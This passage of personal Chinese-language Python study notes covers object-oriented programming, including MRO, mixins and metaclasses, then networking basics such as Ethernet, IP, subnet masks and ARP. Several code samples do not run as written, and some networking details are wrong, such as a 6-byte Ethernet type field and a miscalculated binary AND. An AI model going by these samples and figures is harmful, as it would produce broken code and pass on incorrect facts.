hasattr() ## 判断属性是否存在
getattr() ## 得到属性
setattr() ## 设置属性
delattr() ## 删除属性

hasattr(obj,'name') ## 判断对象 obj 有没有 name 属性
getattr(obj,;'name',None) ## 得到对象 obj 的 name 属性,如果没有返回 None
setattr(obj,'name','aini') ## 设置对象 obj 的 name 属性为 "aini"
delattr(obj,'name') ## 删除对象 obj 的 name 属性
```



# 五，面向对象编程

## 1，类的定义

```python
## 类名驼峰命名 
## 类体中可以写任意Python代码，类体代码在定义时就运行
## __dic__ 可以查看类的命名空间
'''
{'__module__': '__main__', 'school': 'donghua', 'adress': 'shanghai', 'local': <classmethod(<function Student.local at 0x000001BCF418E9E0>)>, 'say_hello': <staticmethod(<function Student.say_hello at 0x000001BCF418EA70>)>, '__init__': <function Student.__init__ at 0x000001BCF418EB00>, 'say_score': <function Student.say_score at 0x000001BCF418EB90>, '__dict__': <attribute '__dict__' of 'Student' objects>, '__weakref__': <attribute '__weakref__' of 'Student' objects>, '__doc__': None}
'''


class Student:
	# 类属性
	# 可以被所有的实例对象所共享
	school = 'donghua'
	adress = 'shanghai'
    stu_count = 0 # 统计注册的实例个数
	
	# 类方法
	@classmethod
	def local(cls):
		print(cls.adress)

	# 静态方法
	# 可以调用类的属性和方法
	@staticmethod
	def say_hello(str):
		print(str)
		Student.local()
	
	# 通过构造函数__init__创建对象的属性
	def __init__(self,name,age,score):
		self.name = name
		self.age = age
		self.score = score
        Student.stu_count += 1
		
	# 创建实例对象方法
	def say_score(self):
		print(f'{self.name}的分数是{self.score}')

print(Student.say_score)  ## <function Student.say_score at 0x00000255F6DDEB90>


s1 = Student('aini',22,80)  ## 实例化
Student.say_score(s1) ## aini的分数是80
s1.say_score() ----- ## 本质是 Student.say_score(s1)
## 通过类名可以调用实例方法，需要传递实例进去


## 实例化发生的三件事情
1，先产生一个空对象
2，Python会自动调用 __init__方法
3，返回初始化完的对象

print(s1.__dict__) ------ ## ## {'name': 'aini', 'age': 22, 'score': 80}

```

## 2，封装

### 2.1  私有属性

```python
## 在属性或方法前加__前缀，可以对外进行隐藏
## 这种隐藏对外不对内，因为__开头的属性会在类定义阶段检查语法时统一变形

class Foo:
	__x = 1

	def __test(self):
		print('from test')
     
    def f2(self):
		print(self.__x)  # 1
		print(self.__test) ## <bound method Foo.__test of <__main__.Foo object at 0x000002063304B7F0>>

## 隐藏属性的访问 
## Python不推荐此方法
print(Foo._Foo__x)  ## 1
print(Foo._Foo__test) ##  <function Foo.__test at 0x000001C42976E320>

## 这种变形操作只在检查类语法的时候发生一次，之后定义__定义的属性都不会变形

Foo.__y = 3
print(Foo.__y) 
```

### 2.2 property使用

```python
## 第一种类型
## 把函数像普通属性一样调用
class Person:

	def __init__(self,name):
		self.__name = name

	@property
	def get_name(self):
		return self.__name

aini = Person('aini')
print(aini.get_name)  ## 'aini'


## 第二种类型
class Person:

	def __init__(self,name):
		self.__name = name


	def get_name(self):
		return self.__name


	def set_name(self,val):
		if type(val) is not str:
			print('必须传入str类型')
			return
		self.__name = val
	
    ## 伪装成数据接口的属性
	name = property(get_name,set_name)

aini = Person('aini')
print(aini.name)  ## 'aini'
aini.name = 'norah'
print(aini.name)  ## 'norah'


## 第三种方法
## 起一个一样的函数名，用不同功能的property装饰
class Person:

	def __init__(self,name):
		self.__name = name

	@property   ## name = property(name)
	def name(self):
		return self.__name

	@name.setter 
	def name(self,val):
		if type(val) is not str:
			print('必须传入str类型')
			return
		self.__name = val
        
    @ name.deleter  
    def name(self):
        print("不能删除")
```

## 3，继承

Python里支持多继承

python3里没有继承任何类的类都继承了Object类

Python2 里有经典类和新式类

经典类：没有继承Object ------------------ 新式类：继承了Object

```Python
class Parent1:
    pass

class Parent2:
    pass

class Sub1(Parent1):  ## 单继承
    pass

class Sub2(Parent1,Parent2):  ## 多继承
    pass

print(Sub1.__bases__)  ## (<class '__main__.Parent1'>,)
print(Sub2.__bases__)  ## (<class '__main__.Parent1'>, <class '__main__.Parent2'>)
```

### 3.1 继承的实现

```python
class OldBoyPeople:
    school = 'OLDBOY'

    def __init__(self, name, age, sex):
        self.name = name
        self.age = age
        self.sex = sex

class Student(OldBoyPeople):

    def choose_course(self):
        print(f'学生 {self.name}正在选课')


class Teacher(OldBoyPeople):

    def __init__(self,name,age,sex,salary,level):

        # 调父类的属性就行
        OldBoyPeople.__init__(self,name,age,sex)
        self.salary = salary
        self.level = level

    def score(self):
        print('老师 %s 正在给学生打分' %self.name)

t = Teacher('agen',25,'man',50000,'一级')
print(t.__dict__)  ## {'name': 'agen', 'age': 25, 'sex': 'man', 'salary': 50000, 'level': '一级'}

stu_1 = Student('aini',22,'man')
print(stu_1.name,stu_1.age,stu_1.sex) ## aini 22 man
print(stu_1.school) ## OLDBOY
stu_1.choose_course() ## 学生 aini正在选课
```

### 3.2 单继承背景下的属性查找

```python
class Foo:
	def f1(self):
		print('Foo.f1')

	def f2(self):
		print('Foo.f2')
		self.f1() ## z这里如何调用自己的f1函数
        # 第一种方法 Foo.f1(self)
        # 第二种方法，把f1函数改为次有属性 self.__f1() 

class Bar(Foo):
	def f1(self):
		print('Bar.f1')
        
obj = Bar()
obj.f2()  ## 到父类调f2,也会把自己传进来，随意 self.f1() == obj.f1()
## Foo.f2
## Bar.f1
```

### 3.3 菱形问题

![image-20230701134915382](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230701134915382.png)

```Python
'''
大多数面向对象语言都不支持多继承，而在Python中，一个子类是可以同时继承多个父类的，这固然可以带来一个子类可以对多个不同父类加以重用的好处，但也有可能引发著名的 Diamond problem菱形问题(或称钻石问题，有时候也被称为“死亡钻石”)，菱形其实就是对下面这种继承结构的形象比喻
'''


class A(object):
    def test(self):
        print('from A')


class B(A):
    def test(self):
        print('from B')


class C(A):
    def test(self):
        print('from C')


class D(B,C):
    pass


obj = D()
obj.test() # 结果为：from B
```

### 3.4 继承原理

```python
## python2 和 Python3 里算出来的mro不一样的

## python到底是如何实现继承的呢？ 对于你定义的每一个类，Python都会计算出一个方法解析顺序(MRO)列表，该MRO列表就是一个简单的所有基类的线性顺序列表，如下

D.mro() 
## [<class '__main__.D'>, <class '__main__.B'>, <class '__main__.C'>, <class '__main__.A'>, <class 'object'>]

B.mro()
## [<class '__main__.B'>, <class '__main__.A'>, <class 'object'>]

## 1.子类会先于父类被检查
## 2.多个父类会根据它们在列表中的顺序被检查
## 3.如果对下一个类存在两个合法的选择,选择第一个父类
```

### 3.5  深度优先和广度优先

![image-20230701135247948](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230701135247948.png)

```python
## 参照下述代码，多继承结构为非菱形结构，此时，会按照先找B这一条分支，然后再找C这一条分支，最后找D这一条分支的顺序直到找到我们想要的属性

class E:
    def test(self):
        print('from E')


class F:
    def test(self):
        print('from F')


class B(E):
    def test(self):
        print('from B')


class C(F):
    def test(self):
        print('from C')


class D:
    def test(self):
        print('from D')


class A(B, C, D):
    # def test(self):
    #     print('from A')
    pass
print(A.mro())
'''
[<class '__main__.A'>, <class '__main__.B'>, <class '__main__.E'>, <class '__main__.C'>, <class '__main__.F'>, <class '__main__.D'>, <class 'object'>]
'''
```

![image-20230701135004435](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230701135004435.png)

```python
## 如果继承关系为菱形结构，那么经典类与新式类会有不同MRO，分别对应属性的两种查找方式：深度优先和广度优先
####################  这是经典类：深度优先查找

class G: # 在python2中，未继承object的类及其子类，都是经典类
    def test(self):
        print('from G')

class E(G):
    def test(self):
        print('from E')

class F(G):
    def test(self):
        print('from F')

class B(E):
    def test(self):
        print('from B')

class C(F):
    def test(self):
        print('from C')

class D(G):
    def test(self):
        print('from D')

class A(B,C,D):
    # def test(self):
    #     print('from A')
    pass

obj = A()
obj.test() # 如上图，查找顺序为:obj->A->B->E->G->C->F->D->object
# 可依次注释上述类中的方法test来进行验证,注意请在python2.x中进行测试
```

![image-20230701135140533](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230701135140533.png)

```python
####################  这是新式类：广度优先查找

class G(object):
    def test(self):
        print('from G')

class E(G):
    def test(self):
        print('from E')

class F(G):
    def test(self):
        print('from F')

class B(E):
    def test(self):
        print('from B')

class C(F):
    def test(self):
        print('from C')

class D(G):
    def test(self):
        print('from D')

class A(B,C,D):
    # def test(self):
    #     print('from A')
    pass

obj = A()
obj.test() # 如上图，查找顺序为:obj->A->B->E->C->F->D->G->object
# 可依次注释上述类中的方法test来进行验证
```

### 3.6  Mixins机制（解决多继承问题）

```python
## Mixins机制核心：多继承背景下，尽可能地提升多继承的可读性
## 让多继承满足人类的思维习惯

## 民航飞机、直升飞机、轿车都是一个（is-a）交通工具，前两者都有一个功能是飞行fly，但是轿车没有，所以如下所示我们把飞行功能放到交通工具这个父类中是不合理的

class Vehicle:  # 交通工具
    def fly(self):
        '''
        飞行功能相应的代码        
        '''
        print("I am flying")

class CivilAircraft(Vehicle):  # 民航飞机
    pass

class Helicopter(Vehicle):  # 直升飞机
    pass

class Car(Vehicle):  # 汽车并不会飞，但按照上述继承关系，汽车也能飞了
    pass
## -------------------------------------------------------------------------------------------------------------
## 解决方法
class Vehicle:  # 交通工具
    pass

class FlyableMixin:
    def fly(self):
        '''
        飞行功能相应的代码        
        '''
        print("I am flying")

class CivilAircraft(FlyableMixin, Vehicle):  # 民航飞机
    pass

class Helicopter(FlyableMixin, Vehicle):  # 直升飞机
    pass

class Car(Vehicle):  # 汽车
    pass

# ps: 采用某种规范（如命名规范）来解决具体的问题是python惯用的套路
## -------------------------------------------------------------------------------------------------------------
## 使用Minin
class Vehicle:  # 交通工具
    pass

class FlyableMixin:
    def fly(self):
        '''
        飞行功能相应的代码        
        '''
        print("I am flying")

class CivilAircraft(FlyableMixin, Vehicle):  # 民航飞机
    pass

class Helicopter(FlyableMixin, Vehicle):  # 直升飞机
    pass

class Car(Vehicle):  # 汽车
    pass

# ps: 采用某种规范（如命名规范）来解决具体的问题是python惯用的套路
## --------------------------------------------------------------------------------------------------------
```

### 3.7 使用minin注意事项

```python
## 使用Mixin类实现多重继承要非常小心

## 首先它必须表示某一种功能，而不是某个物品，python 对于mixin类的命名方式一般以 Mixin, able, ible 为后缀
## 其次它必须责任单一，如果有多个功能，那就写多个Mixin类，一个类可以继承多个Mixin，为了保证遵循继承的“is-a”原则，只能继承一个	标识其归属含义的父类
## 然后，它不依赖于子类的实现
## 最后，子类即便没有继承这个Mixin类，也照样可以工作，就是缺少了某个功能。（比如飞机照样可以载客，就是不能飞了）
```

### 3.8 派生与方法重用

```python
# 子类可以派生出自己新的属性，在进行属性查找时，子类中的属性名会优先于父类被查找，例如每个老师还有职称这一属性，我们就需要在Teacher类中定义该类自己的__init__覆盖父类的

class OldBoyPeople:
	def __init__(self,name,age,sex):
		self.name = name
		self.age = age
		self.sex = sex
		
	def f1(self):
		print('%s say hello' %self.name)
		
class Teacher(OldBoyPeople):
	def __int__(self,name,age,sex,level,salary):
        
		## 第一种方法（不依赖于继承）
		## OldBoyPeople.__init__(self,name,age,sex)
		
		## 第二种方法（严格依赖继承,只能用于新式类）
            ## Python2中需要传入类和本身
            ## super(Teacher, self).__init__(name.age, sex)
            ## Python3中什么也不需要传
		super().__init__(name,age,sex)
        
        ## super 根据当前类的mro去访问父类里面去找
		
		self.level = level
		self.salary = salary
        
## super 严格遵守 mor 去找父类，而不是我们肉眼看到的

#A没有继承B
class A:
   def test(self):
		super().test()

class B:
    def test(self):
        print('from B')

class C(A,B):
    pass

C.mro() # 在代码层面A并不是B的子类，但从MRO列表来看，属性查找时，就是按照顺序C->A->B->object，B就相当于A的“父类”
 ## [<class '__main__.C'>, <class '__main__.A'>, <class '__main__.B'>,<class ‘object'>]
obj=C()
obj.test() # 属性查找的发起者是类C的对象obj，所以中途发生的属性查找都是参照C.mro()
## from B
```

### 3.9 组合

```python
'''
在一个类中以另外一个类的对象作为数据属性，称为类的组合。组合与继承都是用来解决代码的重用性问题。不同的是：继承是一种“是”的关系，比如老师是人、学生是人，当类之间有很多相同的之处，应该使用继承；而组合则是一种“有”的关系，比如老师有生日，老师有多门课程，当类之间有显著不同，并且较小的类是较大的类所需要的组件时，应该使用组合，如下示例
'''

class Course:
    def __init__(self,name,period,price):
        self.name=name
        self.period=period
        self.price=price
    def tell_info(self):
        print('<%s %s %s>' %(self.name,self.period,self.price))

class Date:
    def __init__(self,year,mon,day):
        self.year=year
        self.mon=mon
        self.day=day
    def tell_birth(self):
       print('<%s-%s-%s>' %(self.year,self.mon,self.day))

class People:
    school='清华大学'
    def __init__(self,name,sex,age):
        self.name=name
        self.sex=sex
        self.age=age

#Teacher类基于继承来重用People的代码，基于组合来重用Date类和Course类的代码
class Teacher(People): #老师是人
    def __init__(self,name,sex,age,title,year,mon,day):
        super().__init__(name,age,sex)
        self.birth=Date(year,mon,day) #老师有生日
        self.courses=[] #老师有课程，可以在实例化后，往该列表中添加Course类的对象
    def teach(self):
        print('%s is teaching' %self.name)


python=Course('python','3mons',3000.0)
linux=Course('linux','5mons',5000.0)
teacher1=Teacher('lili','female',28,'博士生导师',1990,3,23)

# teacher1有两门课程
teacher1.courses.append(python)
teacher1.courses.append(linux)

# 重用Date类的功能
teacher1.birth.tell_birth()

# 重用Course类的功能
for obj in teacher1.courses: 
    obj.tell_info()
```

## 4，多态

### 4.1 多态的一种方式

```python
## 多态：同一种事务的多种状态
## 多态性指的是可以在不考虑对象具体类型的情况下而直接使用对象

class Animal:
	def say(self):
		print('动物基本的发声')

class Person(Animal):
	def say(self):
		super().say()
		print('啊啊啊啊啊啊啊啊')

class Dog(Animal):
	def say(self):
		super().say()
		print('汪汪汪')

class Pig(Animal):
	def say(self):
		super().say()
		print('哼哼哼')

person = Person()
dog = Dog()
pig = Pig()

## 定义统一的接口，实现多态
def animal_say(animal):
	animal.say()

animal_say(person)
animal_say(dog)
animal_say(pig)

## 多态的例子
def my_len(val):
    return val.__len__()

my_len('aini')
my_len([1,12,3,4,5,'hhh'])
my_len({'name':'aini','age':22})
```

### 4.2 Python推崇的多态

```Python
## 鸭子类型，不用继承

class Cpu:
	def read(self):
		print('cpu read')
		
	def write(self):
		print('cpu write')
		
class Meu:
	def read(self):
		print('meu read')

	def write(self):
		print('meu write') 
		
class Txt:
	def read(self):
		print('txt read')

	def write(self):
		print('txt write') 


cpu = Cpu()
meu = Meu()
txt = Txt()
```

## 5，classmethod

```python
import setting

class Mysql:

	def __init__(self,ip,port):
		self.ip = ip
		self.port = port

	def func(self):
		print('%s %s' %(self.ip,self.port))

	@classmethod  ## 提供一种初始化对象的方法
	def from_conf(cls):
		return cls(setting.IP,setting.PORT)  ## 返回的就是一个实例化的对象，不需要我自己一个个创建

obj = Mysql.from_conf()
print(obj.__dict__)  ## {'ip': '127.0.0.1', 'port': 3306}

```

## 6，staticmethod

```python
class Mysql:

	def __init__(self,ip,port):
		self.ip = ip
		self.port = port
	@staticmethod
	def create_id():
		import uuid
		return uuid.uuid4()

obj = Mysql('127.0.0.1','3306')

## 像普通函数一样调用就可以，不会自动传参，需要人工传参
print(Mysql.create_id())  ## 57c42038-b169-4f25-9057-d83795d097cc
print(obj.create_id()) ## 485372bc-efca-4da8-a446-b11c7bbf3c9b
```

## 7，内置方法

### 7.1 什么是内置方法

```python
## 定义在类内部，以__开头和__结尾的方法称之为内置方法

## 会在满足某种情况下回自动触发执行
## 为什么用： 为了定制化我们的类或者对象
```

### 7.2 如何使用内置方法

```python
# __str__
# __del__

class People:
    def __init__(self,name,age):
        self.name = name
        self.age = age
        
    def say(self):
        print('<%s:%s>'%(self.name,self.age))

obj = People('aini',22)
print(obj)  ## <__main__.People object at 0x00000276F6B8B730>

## ----------------------------------------------------------------------

## __str__ 来完成定制化操作
class People:
    def __init__(self,name,age):
        self.name = name
        self.age = age
        
    def say(self):
        print('<%s:%s>'%(self.name,self.age))
    
    def __str__(self):
        print('这是xxxxx对象')   ## 值起到提示作用
        return '<%s:%s>' % (self.name, self.age)  ## 必须要有return，而且返回字符串

obj = People('aini',22)
print(obj)  ##  <aini:22>

## ----------------------------------------------------------------------------------------
# __del__ :在清理对象时触发，会先执行该方法

class People:
    def __init__(self,name,age):
        self.name = name
        self.age = age
        
    def say(self):
        print('<%s:%s>'%(self.name,self.age))
        
    def __del__(self):
        print('running......')

obj = People('aini',22)
print('=======================')

'''
 == == == == == == == == == == == =    ## 程序运行完了，要清理对象
running......  ## 清理对象时云运行
'''

## ---------------------------------------------------------------------------------------
class People:
    def __init__(self,name,age):
        self.name = name
        self.age = age
        
    def say(self):
        print('<%s:%s>'%(self.name,self.age))
        
    def __del__(self):
        print('running......')

obj = People('aini',22)
del obj
print('=======================')

'''
running......  ## 清理对象时云运行
 == == == == == == == == == == == =    ## 程序运行完了
'''

## ---------------------------------------------------------------------------------------------
#####  对象本身占得是应用程序的内存空间，所以没有多大用处

##### 但是如果对象某个属性x 比如 obj.x 占得是操作系统内存空间，对象运行完了以后Python回收的是程序中的内存空间
### 操作系统不会被回收

class People:
    def __init__(self,name,age):
        self.name = name
        self.age = age
        self.x = open('aini.txt','w',encoding="utf-8")
        
    def say(self):
        print('<%s:%s>'%(self.name,self.age))
        
    def __del__(self):
        print('running......')
        ## 发起系统调用，告诉系统回收操作系统资源,比如如下：
        self.x.close()

obj = People('aini',22)
print('=======================')
```

## 8,元类介绍

```python
## 元类----------------> 用来实例化产生类的那个类
## 关系 ： 元类---------------实例化 --------------->类----------------------> 对象

class People:
	def __init__(self, name, age):
		self.name = name
		self.age = age

	def say(self):
		print('<%s:%s>' % (self.name, self.age))

## 查看内置元类
print(type(People))  # <class 'type'>
print(type(int))     # <class 'type'>

## class关键字定义的类和内置的类都是由type产生的
```

### 8.1 class关键字创建类的步骤

```python
# 类三大特征：类名 class_name || 类的基类  clas_bases = (Object) || 类体本身 --> 一对字符串（执行类体代码，拿到运行空间）

class People:
	def __init__(self, name, age):
		self.name = name
		self.age = age

	def say(self):
		print('<%s:%s>' % (self.name, self.age))
class_body = '''
	def __init__(self, name, age):
		self.name = name
		self.age = age

	def say(self):
		print('<%s:%s>' % (self.name, self.age))
'''
class_dic = {} # 定义类的命名空间

# 类名 
	class_name = "People"
# 类的基类  
	clas_bases = (object,)
# 执行类体代码，拿到运行空间
    exec(class_body,{},class_dic)  # 空字典指的是全局命名空间  class_dic是类的命名空间 
    ## 运行拿到exec以后可以拿到类体代码的运行空间，放在class_dic 里

    print(class_dic) 
    ## {'__init__': <function __init__ at 0x0000016A0BDC9900>, 'say': <function say at 0x0000016A0BE2E320>}

# 调用元类
	People = type(class_name,class_basis,class_dic)
    print(People)  ## <class '__main__.People'>
```

### 8.2 定制元类，控制类的产生

```python
## 定制元类
class Mymeta(type): ## 只有继承了type类的类才可以称之为元
    ## 运行__init__方法的时候，空对象和这些class_name,class_basis,class_dic一共四个参数一起传进来了
    ## 所以需要四个参数接受
    
    ## 重写了造对象的方法，不写__new__方法的话自动创建空对象
    ## 参数为： 类本身，调用类时所传入的参数
    def __new__(xls,*args,**kwargs):
        ##第一种方法 ----------------> 调父类的__new__()方法造对象 
        return super().__new__(cls,*args,**kwargs)
    	## 第二种方法 -----------------> 调用元类的内置方法
        return type.__new__(cls,*args,**kwargs)

	## 可以控制类的产生
    def __init__(self,class_name,class_basis,class_dic):
        ## 类的首字母大写
        if not x.capitalize():
            raise NameError('类名的首字母必须大写啊！！！！')     
     


class People(object ,metaclass = Mymeta): 
    # class产生类的话会自动继承object
    # 底层的话需要明确之指定继承object类
	def __init__(self, name, age):
		self.name = name
		self.age = age

	def say(self):
		print('<%s:%s>' % (self.name, self.age))
        
class_body = '''
	def __init__(self, name, age):
		self.name = name
		self.age = age

	def say(self):
		print('<%s:%s>' % (self.name, self.age))
'''
class_dic = {} # 定义类的命名空间

# 类名 
	class_name = "People"
# 类的基类  
	clas_bases = (object,)
# 执行类体代码，拿到运行空间
    exec(class_body,{},class_dic) 
# 调用元类
	People = Mymeta(class_name,class_basis,class_dic)  ## 调用 type.__call__(方法)
    ## 将参数先传给 __new__方法，造空对象
    ## 然后参数传递给 __init__方法初始化类
    
    ## 调用Mymeta发生的事儿,调用Mymeta 就是type.__call__()
    	# 先造一个空对象 ==> People 调用__new__方法
        #  调用Mymeta这个类的__inti__方法，完成初始化对象的操作(这个过程中可以控制类的产生)
        # 返回初始化好的对象
      
## 总结
	# 控制造空对象过程   重写 __new__()方法
    # 控制类的产生  重写 __init__()方法
```

### 8.3 __new__(方法)

```Python
## 具体看 8.2 控制造空对象的过程
##  __new__() 放下造对象时，早于 __init__() 方法运行  
```

### 8.4 __call__（方法）

```python
## 8.1 中
# 调用元类时
	People = Mymeta(class_name,class_basis,class_dic)  ## 本质就是调用 type的__call__()方法
   

class Foo:
    def __init__(self,x,y):
        self.x = x
        self.y = y
    def __call__(self,name,age):
        print(name,age)
        print('我运行了obj下面的__call__方法')
        
obj = Foo(111,222)
obj("aini",'22') 
# 'aini' 22
# '我运行了obj下面的__call__方法'

## 对象的类里定义__call__方法的话，实例对象可以调用

### -------------------------------------------------------------------
## 如果想要控制类的调用， 那就重写__call__()方法
## 定制元类
class Mymeta(type):  
    def __call__(self,*args,**kwargs):
        ## Mymeta.__call__函数内会调用People.__new__()方法
        people_obj = self__new__(self)
        
        ## 可以对类进行定制化
        obj.__dict__['xxxx'] ='所有的obj产生的类我新加了一个属性'
        
        ## Mymeta.__call__函数内调用People.__inti__()方法
        self.__init__(people_obj,*args,**kwargs)
        
    ## 重写了造对象的方法，不写__new__方法的话自动创建空对象
    ## 参数为： 类本身，调用类时所传入的参数
    def __new__(xls,*args,**kwargs):
        ##第一种方法 ----------------> 调父类的__new__()方法造对象 
        return super().__new__(cls,*args,**kwargs)
    	## 第二种方法 -----------------> 调用元类的内置方法
        return type.__new__(cls,*args,**kwargs)

	## 可以控制类的产生
    def __init__(self,class_name,class_basis,class_dic):
        ## 类的首字母大写
        if not x.capitalize():
            raise NameError('类名的首字母必须大写啊！！！！')     
     

        
class People(object ,metaclass = Mymeta): 
    # class产生类的话会自动继承object
    # 底层的话需要明确之指定继承object类
	def __init__(self, name, age):
		self.name = name
		self.age = age
        
    def __new__(cls,*args,**kwargs):
        # 造对象
        return object.__new__(cls,*args,**kwargs)
        

	def say(self):
		print('<%s:%s>' % (self.name, self.age))
 ## ------------------------------------------------------------        
 class_body = '''
	def __init__(self, name, age):
		self.name = name
		self.age = age

	def say(self):
		print('<%s:%s>' % (self.name, self.age))
'''
class_dic = {} # 定义类的命名空间
class_name = "People" 
clas_bases = (object,)
exec(class_body,{},class_dic) 
 People = Mymeta(class_name,class_basis,class_dic)  ## 调用 type.__call__(方法)     
    
  ## 调用Mymeta发生的事儿,调用Mymeta 就是type.__call__()
    	# 先造一个空对象 ==> People 调用__new__方法
        #  调用Mymeta这个类的__inti__方法，完成初始化对象的操作(这个过程中可以控制类的产生)
        # 返回初始化好的对象
        
             
  obj = People('aini',22)
	# 实例化People发生的三件事
    	# 调用Mymeta.__call__(self,*args,**kwargs)方法
        #  Mymeta.__call__函数内会调用People.__new__()方法
        #  Mymeta.__call__函数内调用People.__inti__()方法

```

### 8.5 属性查找的原则

![image-20230704003043593](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230704003043593.png)

```python
## 属性查找的原则：对象 ----> 类 ----------->父类
## 切记：父类不是元类，不会去从元类里找
```

# 六，网络编程

## 10.1 cs架构与bs架构

```python
## cs架构
    ## Client ----------------------------------------- Server

    # 客服端软件 <==============================> 服务端软件
    # 操作系统<===================================> 操作系统
    # 计算机硬件 <================================> 计算机硬件

## bs架构
	## Brower ----------------------------------------------- Server
```

## 10.2 网络通信

```python
## 网络存在的意义就是跨地域数据传输---------》 称之为通信
## 网络 = 物理链接介质  + 互联网通信协议
```

## 10.3  OSI七层协议

```python
## 五层协议
	#  应用层
    # 传输层
    # 网络层
    # 数据链路层
    # 物理层

## 协议：规定数据的组织格式   格式：头部 + 数据部分
```

## 10.4 网络协议

```Python
## 计算机1 ----------------------------计算机2、
## 应用层 ------------------------------应用层
## 传输层 ----------------------------- 传输层
## 网络层 ----------------------------- 网络层 ------> (源IP地址，目标IP地址) 数据1
## 数据链路层 --------------------------数据链路层 --->(源mac地址，目标mac地址) 数据2((源IP地址，目标IP地址) 数据1)
## 物理层1 ------------二层交互机------------物理层2

# 二层交互机将从 物理层1接受的 二进制数据接收到以后可以解析到数据链路层(源mac地址，目标mac地址) 数据2 再转换成二进制 发给物理层2
```



#### 10.4.1 物理层

```Python
## 物理层由来：上面提到，孤立的计算机之间要想一起玩，就必须接入internet，言外之意就是计算机之间必须完成组网

## 物理层功能：主要是基于电器特性发送高低电压(电信号)，高电压对应数字1，低电压对应数字0

## 物理层负责发送电信号
	## 单纯的电信号毫无意义，必须对其进行分组
    
```

![image-20230704134226026](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230704134226026.png)

#### 10.4.2  数据链路层（帧）

```python
## 数据链路层： Ethernet以太网协议
	## 规定一：一组数据称之为一个数据帧
    ## 规定二：数据帧分成两部分 头 + 数据两部分
    		## 头: 源地址与目标地址，该地址是Mac地址
        	## 数据：包含的是网络层整体的内容
    ## 规定三：但凡介入互联网的主机，必须有网卡，每一块网卡在出场时标志好一个全世界独一无二的地址该地址称之为-----> mac地址
    
## mac地址：(了解)
'''
    head中包含的源和目标地址由来：ethernet规定接入internet的设备都必须具备网卡，发送端和接收端的地址便是指网卡的地址，即mac地址

    mac地址：每块网卡出厂时都被烧制上一个世界唯一的mac地址，长度为48位2进制，通常由12位16进制数表示（前六位是厂商编号，后六位是流水线号）  
'''
                
## head包含：(固定18个字节) ----------------- 源地址与目标地址，该地址是Mac地址
'''
    发送者／源地址，6个字节
    接收者／目标地址，6个字节
    数据类型，6个字节
    data包含：(最短46字节，最长1500字节)
'''
## 数据包的具体内容
## head长度＋data长度＝最短64字节，最长1518字节，超过最大限制就分片发送

## 注意：计算机通信基本靠吼，既以太网协议的工作方式是广播
```

#### 10.4.3 网络层（包）

![](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230704142732972.png)

```python
## 网络层：IP协议
    ## 划分IP协议
    ## 每一个广播域但凡要接通外部，一定要有一个网关帮内部的计算机转发包到公网网关与外界通信走的是路由协议
    
## 规定1：一组数据称之为一个数据包
## 规定2： 数据帧分成两个部分----> 头 + 数据
	## 头包含：源地址与目标地址，该地址是IP地址
    ## 数据包含：传输层整体的内容
    
```



##### 3-1 ip协议

```python
# IP协议：
    '''
        1,规定网络地址的协议叫ip协议，它定义的地址称之为ip地址，广泛采用的v4版本即ipv4，它规定网络地址由32位2进制表示
        2,范围0.0.0.0-255.255.255.255
        3,一个ip地址通常写成四段十进制数，例：172.16.10.1

    '''
    ## ip地址分成两部分
        # 网络部分：标识子网
        # 主机部分：标识主机
    # 注意：单纯的ip地址段只是标识了ip地址的种类，从网络部分或主机部分都无法辨识一个ip所处的子网

    # 例：172.16.10.1与172.16.10.2并不能确定二者处于同一子网

    #ipv4地址：
        # 8bit.8bit.8bit.8bit
        0.0.0.0 ~ 255.255.255.255
    ## ipv6
        ## 目前在逐渐普及
```



##### 3-2 子网掩码

```Python
   ## 子网掩码
		# 8bit.8bit.8bit.8bit
    ## 一个合法的IPv4地址组成部分=ip地址/子网掩码 ---------------------> 区分广播域
    	## 172.16.10.1/255.255.255.0
        ## ## 172.16.10.1/24  -----------------> 表示24位二进制数
'''
    知道”子网掩码”，我们就能判断，任意两个IP地址是否处在同一个子网络。方法是将两个IP地址与子网掩码分别进行AND运算（两个数位都	为1，运算结果为1，否则为0），然后比较结果是否相同，如果是的话，就表明它们在同一个子网络中，否则就不是。
'''

## 同为1结果为1，有0结果为0
    ## 计算机1的
        ## IP地址
        172.16.10.1：	 		10101100.00010000.00001010.000000001
        ## 子网掩码地址
        255255.255.255.0: 		 11111111.11111111.11111111.00000000
        ## 网络地址
                                10110101100.00010000.00001010.000000001->172.16.10.0
    ## 计算机2的
        ## IP地址
        172.16.10.2：			10101100.00010000.00001010.000000010
        ## 子网掩码地址
        255255.255.255.0:		11111111.11111111.11111111.00000000
        ## 网络地址
                                10101100.00010000.00001010.000000001->172.16.10.0
     ## 两个计算机网络地址一样，所以属于一个局域网内
```



##### 3-3 APR协议

```Python
    
## 事先知道的是对方的IP地址
## 但是计算机的底层通信是基于ethernet以太网协议的mac地址通信

##API协议 -----------> 能够将IP地址解析成mac地址

## 两台计算机再同一个局域网内，直接发包就可以
计算计1             直接                       计算机2
ARP：
自己的IP，对方的IP  
#-1 计算二者的网络地址，如果一样，那ARP协议拿到计算机2的mac地址就可以
#-2 发送广播包

## 两台计算机不在同一个局域网内
计算计1            网关                       计算机2
ARP：
自己的IP，对方的IP  
# 计算二者的网络地址，如果不一样，应该拿到网关的mac地址

## FF:FF:FF:FF:FF:FF  ---------------------->意思就是要对方的Mac地址
##-1 如果在同一个局域网内，那就拿到了对方的Mac地址
##-2 发送广播包

```

![image-20230704153508853](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230704153508853.png)

![image-20230704153212739](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230704153212739.png)

##### 3-4 总结性知识

```python
## Mac地址标识的是局域网内的一台机器
## IP地址 + Mac地址 -------------------> 可以标识全世界范围内独一无二的一台计算机
## IP+ Mac + port -----------------------> 可以找到全世界范围内独一无二的应用程序

## 或者
## IP地址 ----------> 可以标识全世界范围内独一无二的一台计算机
## 
```

#### 10.4.4 传输层（段）

```python
